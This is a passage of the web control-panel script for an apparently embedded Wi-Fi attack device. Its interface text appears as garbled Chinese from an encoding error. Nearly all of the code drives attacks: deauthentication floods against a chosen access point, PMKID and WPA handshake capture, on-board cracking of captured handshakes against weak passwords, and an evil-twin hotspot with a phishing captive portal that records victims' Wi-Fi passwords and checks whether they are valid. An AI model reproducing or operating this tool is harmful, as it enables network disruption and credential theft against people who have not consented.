<div class="card"><h2>æ—¥å¿—</h2><pre id="log"></pre></div>
</main>
<script>
var sel={ssid:'',bssid:'',ch:6};
function q(id){return document.getElementById(id)}
function api(p){return fetch(p,{cache:'no-store'}).then(function(r){return r.json()})}
function esc(s){return String(s).replace(/[&<>"]/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]})}
function startScan(b5){
  var b=b5?q('s5'):q('s24');
  b.disabled=true;b.textContent='æ‰«æä¸­...';
  fetch('/api/scan?b5='+b5,{cache:'no-store'}).catch(function(){}).then(function(){pollScan(0)});
}
// A sweep takes 2-4s and the radio drops the AP for part of it, so refreshing once
// right after /api/scan returns would still render an empty table.
function pollScan(n){
  if(n>30){refresh();return}
  api('/api/status').then(function(s){
    if(s.scanning){setTimeout(function(){pollScan(n+1)},400);return}
    refresh();
  }).catch(function(){setTimeout(function(){pollScan(n+1)},700)});
}
q('s24').onclick=function(){startScan(0)};
q('s5').onclick=function(){startScan(1)};
function renderAps(list,s5g){
  var tb=q('aps');
  if(!list.length){tb.innerHTML='<tr><td colspan="5" class="tiny">æ²¡æ‰«åˆ°ï¼Œé‡è¯•ä¸€æ¬¡</td></tr>';return}
  var grp={};
  list.forEach(function(a){
    var k=a.ssid;
    if(!grp[k])grp[k]={b2:0,b5:0};
    if(a.b5)grp[k].b5++;else grp[k].b2++;
  });
  tb.innerHTML=list.map(function(a){
    var g=grp[a.ssid],tag='';
    if(s5g){
      if(g.b5&&g.b2)tag='<span class="badge">åŒé¢‘åˆä¸€</span>';
      else if(g.b5)tag='<span class="badge r">çº¯5G</span>';
      else tag='<span class="badge">ä»…2.4G</span>';
    }
    return '<tr data-b="'+a.bssid+'" data-s="'+esc(a.ssid)+'" data-c="'+a.ch+'"><td>'+esc(a.ssid)+' '+
      tag+(a.enc?'':' <span class="badge g">OPEN</span>')+
      '</td><td class="tiny">'+a.bssid+'</td><td class="tiny">'+(a.b5?'5G':'2.4G')+' ch'+a.ch+
      '</td><td>'+a.rssi+'</td><td class="tiny">é€‰å®ƒ</td></tr>'
  }).join('');
  Array.prototype.forEach.call(tb.querySelectorAll('tr'),function(tr){
    tr.onclick=function(){
      Array.prototype.forEach.call(tb.querySelectorAll('tr'),function(x){x.classList.remove('sel')});
      tr.classList.add('sel');sel={ssid:tr.dataset.s,bssid:tr.dataset.b,ch:+tr.dataset.c};
      q('ssid').value=sel.ssid;q('bssid').value=sel.bssid;q('ch').value=sel.ch;q('pssid').value=sel.ssid;
    };
  });
}
q('dstart').onclick=function(){
  var b=q('bssid').value.trim(),c=+q('ch').value||6,n=+q('cnt').value||0;
  q('dstart').disabled=true;
  api('/api/deauth?bssid='+encodeURIComponent(b)+'&ch='+c+'&count='+n).then(function(r){
    if(!r.ok)alert('å¯åŠ¨å¤±è´¥ï¼š'+r.msg);q('dstart').disabled=false;refresh();
  });
};
q('dstop').onclick=function(){api('/api/stop').then(function(){q('dstart').disabled=false;refresh()})};
function rtest(ch){api('/api/radiotest?ch='+ch).then(function(r){
  var e=r.err||{},k=Object.keys(e),bad=[];
  k.forEach(function(x){if(x.indexOf('cur_')<0&&e[x]!==0)bad.push(x+'='+e[x])});
  q('rtout').innerHTML='ch'+r.ch+' '+r.band+' â†’ å®žé™…ä¿¡é“ '+e.cur_channel+'ï¼›'+
    (bad.length?('<b>å¤±è´¥çŽ¯èŠ‚ï¼š'+bad.join(', ')+'</b>'):'<b>å…¨éƒ¨è¿”å›ž 0ï¼ˆé©±åŠ¨æ”¾è¡Œï¼‰</b>')+
    '<br><span class="tiny">'+JSON.stringify(e)+'</span>';
})}
q('pmk').onclick=function(){
  if(!sel.bssid){alert('å…ˆåœ¨ä¸Šé¢ç‚¹ä¸€ä¸ªç›®æ ‡ AP');return}
  var btn=q('pmk');
  if(btn.textContent.indexOf('åœæ­¢')>=0){
    api('/api/pmkid?on=0').then(function(r){btn.textContent='æŠ“ PMKID';showPmk(r)});
    return;
  }
  btn.textContent='åœæ­¢æŠ“å–';
  api('/api/pmkid?on=1&bssid='+encodeURIComponent(sel.bssid)+'&ch='+sel.ch).then(function(r){
    q('pmkout').textContent='ç›‘å¬ä¸­â€¦çŽ°åœ¨åŽ»ç‚¹ã€Œå¼€å§‹ã€è¸¢äººï¼Œè®©å®ƒé‡æ–°è¿žæŽ¥';
    showPmk(r);
  });
};
function showPmk(r){
  var h='';
  if(r.list&&r.list.length){
    h='<b>æŠ“åˆ° '+r.list.length+' æ¡</b>ï¼Œé•¿æŒ‰å¤åˆ¶ï¼š<br>';
    for(var i=0;i<r.list.length;i++)h+='<div style="word-break:break-all;font-family:monospace;font-size:11px;margin:4px 0">'+r.list[i]+'</div>';
  }else{
    h='å·²ç›‘å¬ï¼Œassoc å¸§ '+r.assoc+' ä¸ªï¼ŒPMKID 0 æ¡ã€‚'+(r.on?'':'ï¼ˆå·²åœæ­¢ï¼‰');
  }
  q('pmkout').innerHTML=h;
}
q('hsbtn').onclick=function(){
  if(!sel.bssid){alert('å…ˆåœ¨ä¸Šé¢ç‚¹ä¸€ä¸ªç›®æ ‡ AP');return}
  var s=parseInt(q('hssec').value)||120;
  q('hsout').textContent='å¯åŠ¨ä¸­â€¦';
  api('/api/hs?start=1&ch='+sel.ch+'&sec='+s).then(function(r){
    q('hsout').textContent='æŠ“åŒ…ä¸­ '+s+' ç§’ï¼ˆch'+sel.ch+'ï¼‰ã€‚çŽ°åœ¨åŽ»ç‚¹ã€Œå¼€å§‹ã€è¸¢äººï¼Œé€¼æ‰‹æœºé‡è¿žï¼ŒæˆåŠŸçŽ‡æœ€é«˜ã€‚';
    refresh();
  }).catch(function(){q('hsout').textContent='å¯åŠ¨å¤±è´¥ï¼šå¯èƒ½å·²åœ¨æŠ“åŒ…ä¸­'});
};
function kb(n){return n>1024?(n/1024).toFixed(1)+' KB':n+' B'}
function showHs(r){
  var h='';
  if(r.on)h+='<span class="badge r">æŠ“åŒ…ä¸­</span> '+(r.hs?('å·²æ”¶ '+r.hs+' ä¸ªå®Œæ•´æ¡æ‰‹ Â· '):'')+'EAPOL å¸§ '+r.eapol;
  if(r.files&&r.files.length){
    if(h)h+='<br>';
    h+='<b>å·²ä¿å­˜ '+r.files.length+' ä¸ª pcap</b>ï¼š<br>';
    for(var i=0;i<r.files.length;i++){
      var f=r.files[i];
      h+='<a href="/pcap?f='+encodeURIComponent(f.n)+'">'+f.n+'</a> <span class="tiny">'+kb(f.s)+'</span> '+
         '<button class="crk" data-f="'+encodeURIComponent(f.n)+'">æ¿å†…è¯•å¼±å¯†ç </button><br>';
    }
  }else if(!r.on){h+='è¿˜æ²¡æœ‰æŠ“åˆ°æ¡æ‰‹ã€‚å¼€ã€ŒæŠ“æ¡æ‰‹ã€åŽé…åˆã€Œå¼€å§‹ã€è¸¢äººï¼Œè®©å¯¹æ–¹æ‰‹æœºé‡è¿žã€‚'}
  q('hsout').innerHTML=h;
}
function pollCrack(){
  api('/api/crack').then(function(r){
    if(r.on){q('hsout').textContent='æ¿å†…æ­£åœ¨è¯• 200 æ¡é«˜é¢‘å¼±å¯†ç â€¦ï¼ˆçº¦ 5-10 ç§’ï¼Œåˆ«å…³é¡µé¢ï¼‰';setTimeout(pollCrack,1000);return}
    if(r.result===1)q('hsout').innerHTML='<span class="badge g">å¯†ç æ‰¾åˆ°äº†</span> <b style="font-size:16px">'+r.pw+'</b>';
    else if(r.result===0)q('hsout').textContent='å†…ç½® '+r.dict+' æ¡é‡Œæ²¡æœ‰è¿™ä¸ªå¯†ç ï¼ŒæŠŠ pcap ä¸‹è½½å›žç”µè„‘è·‘å¤§å­—å…¸å§';
    else if(r.result===-1)q('hsout').textContent='è¿™ä¸ª pcap è§£æžå¤±è´¥ï¼ˆä¸æ˜¯å®Œæ•´ 4 æ¬¡æ¡æ‰‹ï¼ŒåªæŠ“åˆ°éƒ¨åˆ† EAPOLï¼‰';
    else q('hsout').textContent='';
  });
}
q('hsout').addEventListener('click',function(e){
  var t=e.target;
  if(t&&t.getAttribute&&t.getAttribute('data-f')){crack(decodeURIComponent(t.getAttribute('data-f')))}
});
function crack(f){
  q('hsout').textContent='å¯åŠ¨ä¸­â€¦';
  api('/api/crack?f='+encodeURIComponent(f)).then(function(r){
    if(r.on){pollCrack()}else{q('hsout').textContent='å·²æœ‰ä»»åŠ¡åœ¨è·‘ï¼Œç¨ç­‰'}
  }).catch(function(){q('hsout').textContent='å¯åŠ¨å¤±è´¥'});
}
q('rt5').onclick=function(){rtest(36)};
q('rt24').onclick=function(){rtest(6)};
q('findc').onclick=function(){
  if(!sel.bssid){alert('å…ˆåœ¨ä¸Šé¢ç‚¹ä¸€ä¸ªç›®æ ‡ AP');return}
  q('findc').disabled=true;q('clist').textContent='æ­£åœ¨ç›‘å¬ '+sel.ch+' ä¿¡é“ 6 ç§’â€¦ï¼ˆå¦‚æžœå’Œç›®æ ‡ä¸åŒä¿¡é“ï¼Œä½ çš„ WiFi ä¼šæ–­å‡ ç§’ï¼Œé‡è¿žåŒä¸€ä¸ªçƒ­ç‚¹å³å¯ï¼‰';
  api('/api/clients?bssid='+encodeURIComponent(sel.bssid)+'&ch='+sel.ch+'&ms=6000').then(function(r){
    q('findc').disabled=false;
    q('clist').innerHTML=r.count?('<b>æ‰¾åˆ° '+r.count+' ä¸ªå®¢æˆ·ç«¯</b>ï¼ˆä»Ž '+r.frames+' å¸§é‡Œï¼‰<br><span class="tiny">'+r.list.join('<br>')+'</span>')
      :'è¿™ä¸ªä¿¡é“ä¸Š 6 ç§’å†…æ²¡æœ‰å®¢æˆ·ç«¯åœ¨å‘å¸§ï¼šç›®æ ‡å¯èƒ½æ²¡äººåœ¨ç”¨ï¼Œæˆ–è€…å®ƒå°±åœ¨éš”å£ä¿¡é“ï¼Œæ¢ä¸ªç›®æ ‡è¯•è¯•';
    refresh();
  }).catch(function(){q('findc').disabled=false;q('clist').textContent='è¯·æ±‚è¶…æ—¶/æ–­å¼€ï¼Œé‡è¿ž WiFi åŽåˆ·æ–°é¡µé¢'});
};
q('pstart').onclick=function(){
  var s=q('pssid').value.trim()||q('ssid').value.trim(),c=+q('ch').value||6;
  if(c>13)c=6;
  if(!s){alert('å…ˆåœ¨åˆ—è¡¨é‡Œç‚¹ä¸€è¡Œé€‰ç›®æ ‡ï¼Œæˆ–åœ¨ã€Œé’“é±¼ SSIDã€é‡Œæ‰‹å¡«');return}
  if(!confirm('å¼€é’“ä¼šæŠŠçƒ­ç‚¹æ”¹åä¸ºã€Œ'+s+'ã€ï¼Œå½“å‰ WiFi ç«‹åˆ»æ–­å¼€ã€‚\n\nä¹‹åŽç”¨æ‰‹æœºé‡è¿žè¿™ä¸ªåŒåçƒ­ç‚¹ï¼ˆå¼€æ”¾ï¼Œæ— å¯†ç ï¼‰ï¼Œæ‰“å¼€ http://192.168.4.1/ çœ‹é’“é±¼é¡µï¼Œhttp://192.168.4.1/admin å›žæŽ§åˆ¶å°ã€‚\n\nç»§ç»­ï¼Ÿ'))return;
  q('pstart').disabled=true;
  api('/api/portal?ssid='+encodeURIComponent(s)+'&ch='+c+'&deauth=1').then(function(r){
    q('pstart').disabled=false;
    if(!r.ok){alert('å¼€é’“å¤±è´¥ï¼š'+r.msg)}
    else{alert('å·²åˆ‡æ¢çƒ­ç‚¹ã€‚æ‰‹æœºé‡è¿žã€Œ'+s+'ã€åŽæ‰“å¼€ http://192.168.4.1/')}
    refresh();
  }).catch(function(){
    q('pstart').disabled=false;
    alert('çƒ­ç‚¹å·²æ”¹åï¼Œè¿žæŽ¥æ–­å¼€æ˜¯æ­£å¸¸çš„ã€‚\nåˆ°æ‰‹æœº WiFi åˆ—è¡¨è¿žã€Œ'+s+'ã€ï¼Œå†æ‰“å¼€ http://192.168.4.1/ æˆ– /admin');
  });
};
q('pstop').onclick=function(){api('/api/portalstop').then(refresh)};
function refresh(){
  api('/api/status').then(function(s){
    q('ip').textContent=s.ip+' Â· æŽ§åˆ¶å° :8080';
    q('d').className='dot'+(s.portal?' hot':'')+(s.deauth?' hot':'');
    q('dstat').innerHTML=s.deauth?('<span class="badge r">è¿è¡Œä¸­</span> å·²å‘ '+s.sent+' å¸§'+(s.clients?(' Â· å®šå‘ '+s.clients+' ä¸ªå®¢æˆ·ç«¯'):' Â· å¹¿æ’­æ¨¡å¼')):'ç©ºé—²'+(s.clients?(' Â· å·²çŸ¥ '+s.clients+' ä¸ªå®¢æˆ·ç«¯'):'');
    q('pstat').innerHTML=s.portal?('<span class="badge r">é’“é±¼ä¸­</span> SSID '+esc(s.portalSsid)+' ch'+s.portalCh+
      ' Â· é¡µé¢è®¿é—® '+s.views+' æ¬¡'):'æœªå¯åŠ¨ã€‚å¼€é’“åŽæ‰‹æœºä¼šè‡ªåŠ¨å¼¹å‡ºéªŒè¯é¡µã€‚';
    q('pstat').innerHTML+=s.portal?'<br><span class="tiny">é’“é±¼é¡µï¼šhttp://'+s.ip+'/ &nbsp; æŽ§åˆ¶å°ï¼š'+s.console+'</span>':'';
    api('/api/aps').then(function(list){renderAps(list||[],s.scan5g)}).catch(function(e){
      var tb=q('aps');if(tb)tb.innerHTML='<tr><td colspan="5" class="tiny">å–åˆ—è¡¨å¤±è´¥: '+e+'</td></tr>'});
    var b24=q('s24'),b5=q('s5');
    if(b24){b24.disabled=!!s.scanning;b24.textContent=s.scanning?'æ‰«æä¸­...':'æ‰«æ 2.4G'}
    if(b5){b5.disabled=!!s.scanning;b5.textContent=s.scanning?'æ‰«æä¸­...':'æ‰«æ 2.4G + 5G'}
    q('log').textContent=(s.log||[]).join('\n');
    var p=q('log');p.scrollTop=p.scrollHeight;
  });
  api('/api/creds').then(function(list){
    var tb=q('creds');
    if(!list.length){tb.innerHTML='<tr><td colspan="3" class="tiny">æš‚æ— </td></tr>';return}
    tb.innerHTML=list.map(function(c){
      return '<tr><td>'+esc(c.ssid)+'</td><td><b>'+esc(c.pass)+'</b></td><td>'+
        (c.valid?'<span class="badge g">æ­£ç¡®</span>':'<span class="badge">é”™è¯¯</span>')+'</td></tr>'
    }).join('');
  });
  api('/api/hs').then(showHs);
}
refresh();setInterval(refresh,2500);
